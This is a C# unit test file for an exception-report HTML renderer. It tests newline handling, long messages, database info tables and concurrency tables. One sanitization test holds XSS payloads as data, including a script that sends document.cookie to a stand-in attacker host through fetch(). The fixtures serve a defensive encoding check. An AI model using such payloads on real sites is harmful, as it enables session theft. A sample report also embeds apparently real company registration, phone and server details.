				AssertContains(expected, actual);
			}
		}

		public void TestMessageWithNewLines()
		{
			var customMessage = @"<Line>This</Line>
<Line>Shall</Line>
<Line>Pass</Line>";

			var xml = GetXmlForReport();
			xml = xml.Replace("<Line>Test Exception</Line>", customMessage);
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			using (var tempFile = renderer.CreateHtmlFile())
			{
				var expected = "This<br>Shall<br>Pass";
				var actual = File.ReadAllText(tempFile.Filename);
				AssertContains(expected, actual);
			}
		}

		public void TestMessageLongText()
		{
			var customMessage = $@"<Line>This</Line>
<Line>super long + {new string('\\', 1024 * 1024 + 8)} + {new string('a', 1024 * 1024 + 100)}</Line>
<Line>text</Line>";

			var xml = GetXmlForReport();
			xml = xml.Replace("<Line>Test Exception</Line>", customMessage);
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			using (var tempFile = renderer.CreateHtmlFile())
			{
				var expected = $"This<br>super long + {new string('\\', 4)} + {new string('a', 1024 * 1024 - 20)}<br>text";
				var actual = File.ReadAllText(tempFile.Filename);
				AssertContains(expected, actual);
			}
		}

		public void TestGetSanitizedXmlDocument()
		{
			var dangerousMessage = @"<XSSTEST>
    <EmailTest>user@contoso.com</EmailTest>
    <StringTest>""Anti-Cross Site Scripting Namespace""</StringTest>
    <AlertWithoutScriptTest>alert(&#39;XSS Attack!&#39;);</AlertWithoutScriptTest>
    <AlertWithScriptTest>&lt;script&gt;alert(&quot;(chuckles) I&#39;m in danger&quot;);&lt;/script&gt;</AlertWithScriptTest>
    <FetchTest>&lt;script&gt;fetch(&quot;www.iliketoscampeopleandcompanies.org/?&quot; + document.cookie);&lt;/script&gt;</FetchTest>
    <NestedTagsTest><NestedTag><NestedTag>&lt;script&gt;alert(&#39;XSS Attack!&amp;&#39;);&lt;/script&gt;</NestedTag></NestedTag></NestedTagsTest>
    <Utf8Test>alert(&#39;XSSあAttack!&#39;);</Utf8Test>
    <MixedTest>&quot;&gt;&lt;script&gt;alert(81);&lt;/script&gt;=</MixedTest>
</XSSTEST>";

			var report = new ExceptionReport(dangerousMessage);
			var renderer = new ExceptionReportRenderer(report);

			var rawDoc = new XmlDocument();
			rawDoc.LoadXml(report.Xml);
			CombineAssertions("Values should be HTML encoded before running sanitization", () =>
			{
				AssertEquals("user@contoso.com", rawDoc.DocumentElement["EmailTest"].InnerText);
				AssertEquals("\"Anti-Cross Site Scripting Namespace\"", rawDoc.DocumentElement["StringTest"].InnerText);
				AssertEquals("alert('XSS Attack!');", rawDoc.DocumentElement["AlertWithoutScriptTest"].InnerText);
				AssertEquals("<script>alert(\"(chuckles) I'm in danger\");</script>", rawDoc.DocumentElement["AlertWithScriptTest"].InnerText);
				AssertEquals("<script>fetch(\"www.iliketoscampeopleandcompanies.org/?\" + document.cookie);</script>", rawDoc.DocumentElement["FetchTest"].InnerText);
				AssertEquals("<script>alert('XSS Attack!&');</script>", rawDoc.DocumentElement["NestedTagsTest"].InnerText);
				AssertEquals("alert('XSSあAttack!');", rawDoc.DocumentElement["Utf8Test"].InnerText);
				AssertEquals("\"><script>alert(81);</script>=", rawDoc.DocumentElement["MixedTest"].InnerText);
			});

			var xmlDoc = renderer.GetSanitizedXmlDocument(dangerousMessage);

			CombineAssertions("Values should be HTML encoded after running sanitization", () =>
			{
				AssertEquals("user@contoso.com", xmlDoc.DocumentElement["EmailTest"].InnerText);
				AssertEquals("&quot;Anti-Cross Site Scripting Namespace&quot;", xmlDoc.DocumentElement["StringTest"].InnerText);
				AssertEquals("alert(&#39;XSS Attack!&#39;);", xmlDoc.DocumentElement["AlertWithoutScriptTest"].InnerText);
				AssertEquals("&lt;script&gt;alert(&quot;(chuckles) I&#39;m in danger&quot;);&lt;/script&gt;", xmlDoc.DocumentElement["AlertWithScriptTest"].InnerText);
				AssertEquals("&lt;script&gt;fetch(&quot;www.iliketoscampeopleandcompanies.org/?&quot; + document.cookie);&lt;/script&gt;", xmlDoc.DocumentElement["FetchTest"].InnerText);
				AssertEquals("&lt;script&gt;alert(&#39;XSS Attack!&amp;&#39;);&lt;/script&gt;", xmlDoc.DocumentElement["NestedTagsTest"].InnerText);
				AssertEquals("alert(&#39;XSSあAttack!&#39;);", xmlDoc.DocumentElement["Utf8Test"].InnerText);
				AssertEquals("&quot;&gt;&lt;script&gt;alert(81);&lt;/script&gt;=", xmlDoc.DocumentElement["MixedTest"].InnerText);

				AssertEquals(1, xmlDoc.DocumentElement["NestedTagsTest"].ChildNodes.Count);
				AssertEquals(1, xmlDoc.DocumentElement["NestedTagsTest"]["NestedTag"].ChildNodes.Count);
				AssertEquals("&lt;script&gt;alert(&#39;XSS Attack!&amp;&#39;);&lt;/script&gt;", xmlDoc.DocumentElement["NestedTagsTest"]["NestedTag"]["NestedTag"].InnerText);
			});
		}

		public void TestExceptionReportHasAuditDBInfo()
		{
			var xml = GetXmlForReport();
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			using (var tempFile = renderer.CreateHtmlFile())
			{
				var expected = @"<h2>AuditDatabaseInfo</h2>";
				var actual = File.ReadAllText(tempFile.Filename);
				AssertContains(expected, actual);
			}
		}

		public void TestExceptionReportHasAuditDBInfoWithNoAuditDB()
		{
			using (BiServers.TemporarilySetAuditServerToNull())
			{
				var xml = GetXmlForReport();
				var report = new ExceptionReport(xml);
				var renderer = new ExceptionReportRenderer(report);
				using (var tempFile = renderer.CreateHtmlFile())
				{
					var expected = @"<h2>AuditDatabaseInfo</h2>
<table>
<tr>
	<td>SQLServerVersion</td>
	<td></td>
</tr>
<tr>
	<td>DatabaseServerName</td>
	<td></td>
</tr>
<tr>
	<td>AuditDatabaseName</td>
	<td></td>
</tr>
<tr>
	<td>AuditDatabaseSchemaVersion</td>
	<td></td>
</tr>
</table>";
					var actual = File.ReadAllText(tempFile.Filename);
					Assert(!renderer.Failed);
					AssertContains(expected, actual);
				}
			}
		}

		public void TestExceptionReportHasEdwDBInfo()
		{
			var xml = GetXmlForReport();
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			using (var tempFile = renderer.CreateHtmlFile())
			{
				var expected = @"<h2>EdwDatabaseInfo</h2>";
				var actual = File.ReadAllText(tempFile.Filename);
				AssertContains(expected, actual);
			}
		}

		public void TestExceptionReportHasEdwDBInfoWithNoEdwDB()
		{
			using (BiServers.TemporarilySetDataWarehouseServerToNull())
			{
				var xml = GetXmlForReport();
				var report = new ExceptionReport(xml);
				var renderer = new ExceptionReportRenderer(report);
				using (var tempFile = renderer.CreateHtmlFile())
				{
					var expected = @"<h2>EdwDatabaseInfo</h2>
<table>
<tr>
	<td>SQLServerVersion</td>
	<td></td>
</tr>
<tr>
	<td>DatabaseServerName</td>
	<td></td>
</tr>
<tr>
	<td>EdwDatabaseName</td>
	<td></td>
</tr>
<tr>
	<td>EdwDatabaseSchemaVersion</td>
	<td></td>
</tr>
</table>";
					var actual = File.ReadAllText(tempFile.Filename);
					Assert(!renderer.Failed);
					AssertContains(expected, actual);
				}
			}
		}

		#region Implementation

		string GetXmlForReport()
		{
			var testException = GenerateExceptionObject();

			var details = new ExceptionDetails(testException);
			var builder = new ExceptionReportBuilder(new ExceptionReportArgs(testException, "", "", ""));

			return builder.GenerateReport();
		}

		void AssertCreateHtmlFile(string xml)
		{
			ExceptionReport report = new ExceptionReport(xml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			using (TempFile result = renderer.CreateHtmlFile())
			{
				Assert(!renderer.Failed);
				Assert(File.Exists(result.Filename));
			}
		}

		static void AssertTranslation(string xmlFileName, string expectedFileName)
		{
			var xml = GetSampleFileContents(xmlFileName);
			var expected = GetSampleFileContents(expectedFileName);

			ExceptionReport report = new ExceptionReport(xml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			using (TempFile actualPath = renderer.CreateHtmlFile())
			{
				string actual = File.ReadAllText(actualPath.Filename);
				AssertMultilineASCIIEquals("", expected, actual);
			}
		}

		Exception GenerateExceptionObject()
		{
			Exception testException = null;

			try
			{
				ThrowException();
			}
			catch (Exception ex)
			{
				testException = ex;
			}

			AssertNotNull(testException);

			return testException;
		}

		void ThrowException()
		{
			CreateFakeStackThenThrowException();
		}

		void CreateFakeStackThenThrowException()
		{
			throw new Exception("Test Exception");
		}

		[System.Diagnostics.CodeAnalysis.SuppressMessage("CargoWiseOne", "CW1097:DoNotHardcodeTmpOrTempPath", Justification = "Testing")]
		const string testXmlWithCorruptDllVersionSection = @"<EDI_Exception_Report><ErrorReportID>E00040732</ErrorReportID><Subject>AUTO-GENERATED (Silent) Exception Report (E00040732) in Unknown from Mainfreight International Pty Limited - edicomsmfinz</Subject><Key /><LoginName>EnterpriseBatchProcessor</LoginName><DBServerName>SQLEDI\SQLEDI</DBServerName><MachineName>EDDIE</MachineName><MachineLocalUserName>edicomsmfinz</MachineLocalUserName><UsersEmailAddress /><Company>Mainfreight International Pty Limited</Company><CompanyCountryCode>AU</CompanyCountryCode><RegistrationNo1>65 007 252 333</RegistrationNo1><RegistrationNo2 /><Branch>MFOIAU-VICTORIA</Branch><BranchPhone>0393306000</BranchPhone><Department>Branch</Department><TimeOfException>18-May-06 19:06:11</TimeOfException><ShutdownEnterprise>No</ShutdownEnterprise><ExeCreationTime>06-Apr-06 20:06:16</ExeCreationTime><Source>System.Drawing</Source><CurrentModule /><ExceptionMessage>Parameter is not valid.</ExceptionMessage><OpenedForms /><ExceptionDescription>Error processing print job - giving up after 3 attempts (affecting a total of 1 print job(s) in DeliveryGroup 191b27bd-784b-4dc2-ad12-3842dd7133de)</ExceptionDescription><ExceptionDetails><ExceptionType>System.ArgumentException</ExceptionType><Message>Parameter is not valid.</Message><Source>System.Drawing</Source><StackTrace><Calls>41</Calls><Call>   at System.Drawing.Bitmap..ctor(Int32 width, Int32 height, PixelFormat format)
</Call><Call>   at Enterprise.DocumentEngine.ExcelInterface.CreateBitmap(Single Resolution, TPaperDimensions pd, PixelFormat PixFmt)</Call>
</StackTrace><InnerException>NULL</InnerException><EnvironmentInfo><DatabaseInfo><SQLServerVersion>Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
	Dec 17 2002 14:22:05 
	Copyright (c) 1988-2003 Microsoft Corporation
	Enterprise Edition on Windows NT 5.2 (Build 3790: )
</SQLServerVersion><DatabaseServerName>SQLEDI\SQLEDI</DatabaseServerName><MainDatabaseName>Odyssey</MainDatabaseName><DatabaseSchemaVersion>1465.50</DatabaseSchemaVersion></DatabaseInfo><DLLVersions><DLL Name=""BatchProcessor.dll"" Version=""2.0.0.0"" /><DLL Name=""Core.dll"" Version=""2.0.0.0"" /><DLL Name=""mscorlib.dll"" Version=""2.0.0.0"" /><DLL Name=""SharedComponents.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.BatchProcessor.BatchProcess.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.AU.Declaration.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Initialisation.dll"" Version=""2.0.0.0"" /><DLL Name=""SGComms.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.BackupBatchProcessor.Processor.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.PrintProcessing.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.MasterFiles.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.HK.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.NZ.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.ZA.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.MY.Business.dll"" Version=""2.0.0.0"" /><DLL Name=""Enterprise.Customs.AE.Business.dll"" Version=""2.0.0.0"" />Failed to get DLL versions:
Exception of type 'System.OutOfMemoryException' was thrown.</DLLVersions><OSInfo><OSQuickInfo>Microsoft Windows NT 5.2.3790 Service Pack 1</OSQuickInfo><OSType>Win32NT</OSType><OSVersion>5.2.3790.65536</OSVersion><ServicePackLevel>Service Pack 1</ServicePackLevel><CLRVersion>2.0.50727.42</CLRVersion><DotNetVersion>4.5.52301</DotNetVersion><DotNetRelease>379981</DotNetRelease></OSInfo><RegionalSettings><CountryRegionName>Australia</CountryRegionName><Language>English </Language><TimeZone>12:00:00 New Zealand Standard Time</TimeZone><LongDateFormat>dddd, d MMMM yyyy</LongDateFormat><ShortDateFormat>d/MM/yyyy</ShortDateFormat><DateSeperator>/</DateSeperator><LongTimeFormat>h:mm:ss tt</LongTimeFormat><ShortTimeFormat>h:mm tt</ShortTimeFormat><TimeSeperator>:</TimeSeperator><AMSymbol>AM</AMSymbol><PMSymbol>PM</PMSymbol></RegionalSettings><PCInfo><RAM><Physical><Available>1996 MB</Available><Total>2047 MB</Total></Physical><Virtual><Available>327 MB</Available><Total>2047 MB</Total></Virtual></RAM><DiskSpace><EnterpriseDirectory><Path>Q:\Program Files\Eagle Datamation International</Path><FreeForUser>29808 MB</FreeForUser><AvailableToUser>34710 MB</AvailableToUser><FreeForSystem>29808 MB</FreeForSystem></EnterpriseDirectory><TempDirectory><Path>Q:\Documents and Settings\edicomsmfinz\Local Settings\Temp\3\Enterprise\</Path><FreeForUser>29808 MB</FreeForUser><AvailableToUser>34710 MB</AvailableToUser><FreeForSystem>29808 MB</FreeForSystem></TempDirectory></DiskSpace></PCInfo><SystemResourcesUsage><GDIObjectsCount>51</GDIObjectsCount><USERObjectsCount>38</USERObjectsCount><ManagedHeapUsage>967028KB</ManagedHeapUsage><WorkingSetSize>357816KB</WorkingSetSize></SystemResourcesUsage></EnvironmentInfo></ExceptionDetails><UserEvents><Count>0</Count></UserEvents></EDI_Exception_Report>";

		#endregion
	}

	public class ExceptionReportRendererTestWithDummy : TestCaseWithDummy
	{
		public void TestCreateHtmlFile_ConcurrencyTable()
		{
			string mainTable = @"COLUMN INFORMATION<br><table><tr>	<td><b>Column</b></td>	<td><b>Original Value</b></td>	<td><b>DB Value</b></td>	<td><b>Changed Value</b></td>	<td><b>Conflict</b></td>	<td><b>Concurrency</b></td></tr><tr><td>Z0_Bool</td><td>True</td><td>True</td><td>False</td><td>None</td><td>Default - NotifyAndMerge</td></tr><tr><td>Z0_Description</td><td /><td /><td>noodle!</td><td>None</td><td>Default - NotifyAndMerge</td></tr><tr><td>Z0_IsValid</td><td>False</td><td>False</td><td>False</td><td>None</td><td /></tr><tr><td>Z0_Number</td><td>1</td><td>10</td><td>5</td><td><span style='background-color: #FF8080;'>DB Changed</span></td><td>Default - NotifyAndMerge</td></tr><tr><td>Z0_VarCharMax</td><td>Something</td><td>Something</td><td /><td>None</td><td>Default - NotifyAndMerge</td></tr></table><br><br></td>";

			string expectedTable1 = mainTable + @"
</tr>
<tr>
	<td>OpenedForms</td>
	<td></td>
</tr>";
			string expectedTable2 = mainTable + @"
</tr>
<tr>
	<td>Source</td>
	<td>CargoWise.EntityFramework</td>
</tr>";

			string xml = GetXmlForReport();
			AssertCreateHtmlFile(xml, expectedTable1, expectedTable2);
		}

		public void TestCreateHtmlFile_ConcurrencyDeletionMessage()
		{
			deleteRow = true;
			string expectedLine1 = @"COLUMN INFORMATION<br>Row in database has been deleted.<br><br></td>
</tr>
<tr>
	<td>OpenedForms</td>
	<td></td>
</tr>";
			string expectedLine2 = @"COLUMN INFORMATION<br>Row in database has been deleted.<br></td>
</tr>
<tr>
	<td>Source</td>
	<td>CargoWise.EntityFramework</td>
</tr>";

			string xml = GetXmlForReport();
			AssertCreateHtmlFile(xml, expectedLine1, expectedLine2);
		}

		public void TestHyperlinkOfInnerMostException()
		{
			string exceptedLine =
				@"<a name=""Inner Exception Details (2)""><h1>Inner Exception Details (2)</h1></a>(<a href=""#Top"">Top</a>)";

			string xml = GetXmlForReport();
			AssertCreateHtmlFile(xml, exceptedLine);
		}

		[TestDate(2020, 1, 1, 3, 20, 56)]
		public void TestHyperlink_ElementBody_PreviousException()
		{
			try
			{
				Globals.SetIsUnitTestingProductionFunctionality(true);
				var newhandler = new TopLevelExceptionHandler();

				SetUpForLogExceptionsThrownMethod(newhandler, 10);

				Assert(ErrorReporter.ExceptionsThrown.Count >= 10);

				string exceptedLineElement =
					@"<a name=""Previous Exceptions thrown""><h1>Previous Exceptions thrown</h1></a>(<a href=""#Top"">Top</a>)<br><br><table>
<tr>
<td>Count</td>
<td><pre>10</pre></td>
</tr>
<tr>
	<td>Exception</td>";

				string detailedExceptionMessage = @"
Type :System.Exception
Message :Something went wrong.
Stacktrace :
</pre></td>
</tr>
</table>";

				var xml = GetXmlForReport();
				var report = new ExceptionReport(xml);
				var renderer = new ExceptionReportRenderer(report);
				using (var result = renderer.CreateHtmlFile())
				{
					Assert(!renderer.Failed);
					Assert(File.Exists(result.Filename));
					string actual = File.ReadAllText(result.Filename);
					Assert(FormattableString.Invariant($"File should contain expected string.\r\nExpected:{exceptedLineElement}\r\n  in  \r\nActual:{actual}"), cleanString(actual).Contains(cleanString(exceptedLineElement)));
					Assert(FormattableString.Invariant($"File should contain expected string.\r\nExpected:{detailedExceptionMessage}\r\n  in  \r\nActual:{actual}"), cleanString(actual).Contains(cleanString(detailedExceptionMessage)));
				}
			}
			finally
			{
				ErrorReporter.Clear();
				Globals.SetIsUnitTestingProductionFunctionality(false);
			}

			void SetUpForLogExceptionsThrownMethod(TopLevelExceptionHandler handler, int exceptionNumber)
			{
				var exceptionsToThrwon = Enumerable.Range(0, exceptionNumber).Select(i => new Exception("Something went wrong.")).ToArray();

				var exceptionhandled = true;
				foreach (var exception in exceptionsToThrwon)
				{
					handler.HandleUnhandledException(exception, (s, e) => exceptionhandled = false);
				}
				Assert(!exceptionhandled);
			}

			string cleanString(string stringToClean) => stringToClean.Replace("\r", "").Replace("\n", "").Replace("\t", "");
		}

		public void TestExceptionReportHasChildFactoriesID()
		{
			string exceptedLine =
				@"<b>Child Factory IDs</b>";

			string xml = GetXmlForReport();
			AssertCreateHtmlFile(xml, exceptedLine);
		}

		string GetXmlForReport()
		{
			var testException = GenerateExceptionObject();

			var details = new ExceptionDetails(testException);
			var builder = new ExceptionReportBuilder(new ExceptionReportArgs(testException, "", "", ""));

			return builder.GenerateReport();
		}

		void AssertCreateHtmlFile(string xml, params string[] containsExpected)
		{
			ExceptionReport report = new ExceptionReport(xml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			using (TempFile result = renderer.CreateHtmlFile())
			{
				Assert(!renderer.Failed);
				Assert(File.Exists(result.Filename));
				string actual = File.ReadAllText(result.Filename);
				for (int i = 0; i < containsExpected.Length; i++)
				{
					Assert(FormattableString.Invariant($"File should contain expected string[{i}].\r\nExpected:{containsExpected[i]}\r\n  in  \r\nActual:{actual}"), actual.Replace("\r", "").Replace("\n", "").Replace("\t", "").Contains(containsExpected[i].Trim().Replace("\r", "").Replace("\n", "").Replace("\t", "")));
				}
			}
		}

		bool deleteRow;
		Exception GenerateExceptionObject()
		{
			Factory.RefreshEnabled = false;
			Dummy.Z0_Bool = true;
			Dummy.Z0_Number = 1;
			Dummy.Z0_Description = string.Empty;
			Dummy.Z0_VarCharMax = "Something";
			Factory.Save();

			BusinessObjectFactory factory2 = new BusinessObjectFactory();
			factory2.RefreshEnabled = false;
			var dummy2 = factory2.Load<DummyBusinessObject>(Dummy.PK);
			if (deleteRow)
			{
				dummy2.Delete();
			}
			else
			{
				dummy2.Z0_Number = 10;
			}
			factory2.Save();

			Dummy.Z0_Bool = false;
			Dummy.Z0_Number = 5;
			Dummy.Z0_Description = "noodle!";
			Dummy.Z0_VarCharMax = string.Empty;

			try
			{
				Factory.Save(); // should throw exception
			}
			catch (Exception e)
			{
				return e;
			}
			return null;
		}
	}
}
